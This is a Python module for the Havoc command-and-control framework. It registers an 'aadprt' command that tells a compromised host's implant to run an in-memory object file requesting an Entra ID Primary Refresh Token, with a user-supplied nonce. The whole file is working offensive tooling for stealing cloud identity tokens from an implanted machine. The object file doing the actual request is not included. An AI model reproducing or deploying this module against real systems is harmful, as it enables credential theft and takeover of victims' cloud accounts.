
#
# Havoc Module
#
from havoc import Demon, RegisterCommand
from pathlib import Path
import hashlib

def parse_params( demon, params ):
    packer = Packer()

    num_params = len(params)
    
    nonce = ""

    if num_params > 1:
        demon.ConsoleWrite( demon.CONSOLE_ERROR, "Too many parameters" )
        return None

    if num_params < 1:
        demon.ConsoleWrite( demon.CONSOLE_ERROR, "Missing nonce" )
        return None

    if num_params >= 1:
        nonce = params[ 0 ]

    packer.addWstr(nonce)

    return packer.getbuffer()


def aadprt( demonID, *params ):
    TaskID : str    = None
    demon  : Demon  = None
    demon  = Demon( demonID )

    packed_params = parse_params( demon, params )
    if packed_params is None:
        return False

    TaskID = demon.ConsoleWrite( demon.CONSOLE_TASK, "Tasked demon request an Entra ID PRT" )

    demon.InlineExecute( TaskID, "go", f"aadprt.{demon.ProcessArch}.o", packed_params, False )

    return TaskID

RegisterCommand( aadprt, "", "aadprt", "Request an Entra ID PRT", 0, "[nonce]", "" )
